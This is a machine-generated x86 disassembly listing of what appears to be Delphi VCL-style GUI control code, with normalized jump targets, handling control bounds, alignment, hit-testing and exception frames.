je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_44ccbc
mov cl 0x1
sub_44e49c
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_44ca14
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_44ca14
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_44e4cc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_44e4f0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406d24
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_4034a4
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_44da78
mov [ ebx + 0xc ] eax
sub_44e594
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_44c968
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_44c968
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_44e628
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4031f0
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_44bfe0
mov edx [ esp ]
mov eax esi
call sub_44bfbc
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_44c290
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_44c2d4
sub_44e6ac
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_41725c
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_44c38c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_4172c0
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44c234
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e738
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_44e628
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_4530b8
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_44e6ac
pop ecx
jmp r-xdata
sub_44e798
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44e886
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e88d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_44c8a4
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44c874
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_44c874
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404444
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_40408c
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_44c794
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_44e894
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_4034a4
sub_44e8c0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44e8e0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44e900
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44e920
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44e940
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44e960
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44e980
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_421398
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_44bea0
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4034a4
sub_44e9b8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44ea54
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419008
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_459630
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_459818
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44c874
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4594c8
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_459938
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ea5b
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_44ea64
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_44eaa0
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_44ea64
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_44eb50
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_403434
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44eb84
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_44eba4
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_4034a4
test al al
je r-xdata
mov eax edi
call sub_44ebe4
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_44ec10
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_44ec3c
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406d24
mov eax esp
call sub_4172e8
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_44c3b8
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_4034a4
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_4034a4
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_44c3e4
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_4172e8
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_41725c
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_44c38c
sub_44ed64
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_44eda4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b590
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_44edd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44eed0
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_44b94c
push ebx
push sub_450874
call sub_421fec
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424ac8
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_424c70
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_40360c
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46af60
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_40408c
lea eax [ ebx + 0x188 ]
call sub_404038
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44eed7
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_44eed7
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_44ef08
push ebx
push esi
push edi
call sub_403674
mov ebx edx
mov edi eax
mov eax edi
call sub_4211e8
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_405934
mov eax [ edi + 0x178 ]
call sub_4032a8
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_44a4f8
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_44fba8
mov eax edi
call sub_44fde8
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_4032a8
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_44fdac
mov esi eax
mov edx esi
mov eax edi
call sub_44fc14
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_44fde8
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_44ba24
test bl bl
jle r-xdata
call sub_422084
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
sub_44efd8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_44f09c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418acc
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_453278
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4188d4
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_418a20
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4188d4
test eax eax
je r-xdata
sub_44f0ac
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44f950
xor eax eax
push ebp
push sub_44f0ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44bc88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f0f3
mov eax [ ebp - 0x4 ]
call sub_44f958
retn
sub_44f0f3
mov eax [ ebp - 0x4 ]
call sub_44efd8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4507ac
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_44da78
sub_44f128
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_44f143 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_44f1b4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4533bc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_41725c
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44f535
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f53c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_44f44a ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44f3ad
push [ fs : eax ]
mov [ fs : eax ] esp
